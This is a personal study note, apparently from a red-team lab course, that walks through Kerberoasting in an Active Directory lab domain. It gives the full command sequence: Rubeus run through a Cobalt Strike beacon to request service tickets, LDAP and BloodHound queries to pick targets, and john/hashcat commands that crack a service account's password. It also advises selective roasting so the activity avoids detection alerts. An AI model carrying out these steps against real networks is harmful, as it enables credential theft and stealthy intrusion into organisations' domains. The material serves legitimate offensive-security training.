---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Kerberoasting]]  
___

## Description:  

Services run on a machine under the context of a user account. These accounts are either local to the machine (LocalSystem, LocalService, NetworkService) or are domain accounts (e.g. DOMAIN\mssql).

A Service Principal Name (SPN) is a unique identifier of a service instance. SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD.


Kerberoasting is a technique for requesting TGS’s for services running under the context of domain accounts and cracking them offline to reveal their plaintext passwords.

`Rubeus kerberoast` can be used to perform the kerberoasting.  Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt).

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap

[*] Action: Kerberoasting
[*] Searching the current domain for Kerberoastable users
[*] Total kerberoastable users : 2

$krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433*$[...hash...]
$krb5tgs$23$*svc_honey$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io*$[...hash...]

```

However, this approach is very load. 

A much safer approach is to enumerate possible candidates first and kerberoast them selectively.  Simply searching (e.g. using custom LDAP queries) for accounts with SPNs will not trigger alerts.

Find all users (in the current domain) where the **ServicePrincipalName** field is not blank.

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 2
    [+] cn : krbtgt
    [+] cn : MS SQL Service
    [+] cn : Honey Service

```
 or use a bloodhound query

```
MATCH (u:User {hasspn:true}) RETURN u

```

And even extend that query to show paths to computers from those users:

```
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

Once we feel safe about roasting a particular account, we can do so with the `/user` argument.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap

[*] Action: Kerberoasting

[*] Target User            : svc_mssql
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MS SQL Service,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
[*] PwdLastSet             : 5/14/2021 1:28:34 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT

[*] Hash                   : $krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433*$[...hash...]

```

Use `--format=krb5tgs --wordlist=wordlist svc_mssql` for **john** or `-a 0 -m 13100 svc_mssql wordlist` for **hashcat**.

```
root@kali:~# john --format=krb5tgs --wordlist=wordlist svc_mssql
Cyberb0tic       (svc_mssql$dev.cyberbotic.io)
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (12:03 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
